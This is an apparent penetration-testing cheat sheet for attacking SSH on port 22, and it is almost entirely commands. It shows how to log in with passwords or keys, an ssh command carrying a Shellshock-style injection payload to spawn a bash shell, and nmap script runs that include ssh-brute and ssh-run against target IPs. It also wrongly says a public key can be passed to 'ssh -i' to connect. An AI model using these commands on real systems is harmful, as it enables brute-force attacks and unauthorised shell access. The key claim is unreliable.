- Port: 22

Connects to an SSH server using password.
```
ssh -p 22 [USERNAME]@[TARGET-IP]
```
Sets the correct permissions for a private key and uses it to establish an SSH connection.
```
chmod 600 PATH/TO/PRIVATE-KEY then ssh -i PATH/TO/PRIVATE/KEY [USERNAME]@[TARGET-IP]
```
if we have public key we can use it for connect ssh:
```
ssh -i <Publickeyname> user@192.168.1.14 '() { : ;}; /bin/bash'
```

SSH NMAP Scripts:
```
nmap -sV -Pn -vv -p 22 --script ssh-auth-methods,ssh-brute,ssh-hostkey,ssh-publickey-acceptance,ssh-run,ssh2-enum-algos,sshv1 10.10.10.20
```
SSH NSE Scripts
```
nmap -p 22 --script ssh* [TARGET-IP]
```

